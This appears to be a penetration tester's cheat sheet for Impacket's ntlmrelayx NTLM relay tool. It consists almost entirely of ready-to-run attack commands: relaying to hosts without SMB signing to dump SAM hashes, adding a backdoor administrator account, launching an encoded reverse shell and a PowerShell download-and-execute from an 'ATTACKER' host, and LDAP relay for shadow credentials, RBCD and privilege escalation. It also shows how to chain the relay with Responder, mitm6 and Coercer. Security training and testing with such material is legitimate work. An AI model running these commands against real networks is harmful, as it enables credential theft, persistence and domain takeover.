# ntlmrelayx

**Tags:** `#ntlmrelayx` `#impacket` `#ntlmrelay` `#smbrelay` `#lateral` `#activedirectory` `#credentialdumping`

Impacket's NTLM relay attack tool — captures authentication attempts (from Responder, mitm6, Coercer, or PrinterBug) and relays them to other hosts for authentication, SAM/LSA dumps, command execution, or LDAP attacks. Most powerful when SMB signing is disabled, which is common on non-DC Windows hosts.

**Source:** Part of Impacket — pre-installed on Kali

```bash
# Relay to target list — dump SAM by default
ntlmrelayx.py -tf targets.txt -smb2support

# Generate relay target list (hosts without SMB signing)
netexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt
```

> [!note] **ntlmrelayx requires SMB signing disabled** — Domain Controllers have SMB signing enabled by default. Workstations and member servers often do not. Always generate a relay list first with NetExec before running ntlmrelayx. You cannot relay back to the same host that sent the auth.

---

## Setup — Find Relay Targets

```bash
# Find hosts with SMB signing disabled
netexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt

# Manual check
netexec smb 192.168.1.0/24 | grep "signing:False"
```

---

## Basic Relay — SAM Dump (Default)

```bash
# Relay and dump SAM hashes on all targets without signing
ntlmrelayx.py -tf no_signing.txt -smb2support

# Single target
ntlmrelayx.py -t 192.168.1.10 -smb2support

# Output to file
ntlmrelayx.py -tf no_signing.txt -smb2support --output-file relay_hashes
```

---

## Command Execution

```bash
# Execute command on relay target
ntlmrelayx.py -tf no_signing.txt -smb2support -c "whoami"
ntlmrelayx.py -tf no_signing.txt -smb2support -c "net user hacker Password123! /add && net localgroup administrators hacker /add"

# Reverse shell
ntlmrelayx.py -tf no_signing.txt -smb2support \
  -c "powershell -e <BASE64_ENCODED_REVERSESHELL>"

# Download and execute
ntlmrelayx.py -tf no_signing.txt -smb2support \
  -c "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\""
```

---

## Interactive Shell (smbclient)

```bash
# Drop to interactive SMB session on relay target
ntlmrelayx.py -tf no_signing.txt -smb2support -i

# Then connect to the interactive shell (listens on 127.0.0.1:PORT)
netstat -tlnp | grep python   # find port
nc 127.0.0.1 <port>
# Now in smbclient shell — browse shares, upload/download files
```

---

## LDAP Relay Attacks

When you can relay to LDAP (port 389/636) on the DC — doesn't require SMB signing to be disabled.

```bash
# Relay to LDAP — dump domain info
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --no-da --no-acl

# Create a new computer account (useful for Kerberos attacks, MachineAccountQuota > 0)
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --add-computer hacker-pc

# Escalate to DA via ACL abuse (if relayed user has WriteDACL on domain)
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --escalate-user lowpriv

# Shadow credentials attack (add KeyCredential to target)
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --shadow-credentials --shadow-target 'TargetUser'

# Delegate access (RBCD — Resource-Based Constrained Delegation)
ntlmrelayx.py -t ldap://dc01.domain.local -smb2support \
  --delegate-access --escalate-user lowpriv
```

---

## HTTP Relay

Relay HTTP authentication to SMB targets.

```bash
# HTTP to SMB relay
ntlmrelayx.py -tf no_signing.txt -smb2support

# With WPAD (Responder -w captures WPAD auth → relay)
ntlmrelayx.py -tf no_signing.txt -smb2support -wh WPAD-SERVER
```

---

## Combined with Responder

```bash
# 1. Edit /usr/share/responder/Responder.conf — set SMB=Off, HTTP=Off
# 2. Terminal 1 — start Responder
sudo responder -I tun0 -w -d

# 3. Terminal 2 — start ntlmrelayx
ntlmrelayx.py -tf no_signing.txt -smb2support -c "whoami"

# 4. Wait for LLMNR/NBT-NS triggers → relayed to targets
```

---

## Combined with mitm6

```bash
# 1. Terminal 1 — IPv6 poisoning
sudo mitm6 -d domain.local

# 2. Terminal 2 — relay IPv6 auth to LDAP
ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support \
  --add-computer hacker-pc --delegate-access

# mitm6 sends victims to ntlmrelayx HTTP server → relays to LDAP
```

---

## Combined with Coercer / PrinterBug

```bash
# Force target to authenticate to your Kali box, relay to DC's LDAP
# Coercer triggers auth from target → ntlmrelayx relays to DC

ntlmrelayx.py -t ldap://dc01.domain.local -smb2support --shadow-credentials
coercer coerce -t 192.168.1.50 -l KALI-IP -u user -p Password -d domain.local
```

---

## Useful Flags

| Flag | Description |
|---|---|
| `-tf <file>` | Target file (list of IPs) |
| `-t <target>` | Single target |
| `-smb2support` | Enable SMB2 (required for modern Windows) |
| `-c <cmd>` | Execute command on target |
| `-i` | Interactive shell |
| `-e <file>` | Upload and execute file |
| `-6` | IPv6 support |
| `--no-da` | Don't check DA status |
| `--no-acl` | Don't perform ACL attacks |
| `--add-computer` | Add computer account via LDAP |
| `--shadow-credentials` | Shadow creds attack |
| `--delegate-access` | RBCD attack |
| `--escalate-user` | Escalate specific user via LDAP |
| `--output-file` | Save dumped hashes to file |

---

## OPSEC Notes

- SMB relay generates Event ID **4624** (logon type 3) on the relay target — appears as the victim user logging in
- LDAP relay generates **4662** (directory access) on the DC
- `--add-computer` via LDAP creates a computer object — visible in AD (`Get-ADComputer`)
- `--shadow-credentials` adds a `msDS-KeyCredentialLink` attribute — may be monitored
- Running the relay for extended periods with many captured auths generates a lot of lateral movement events

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
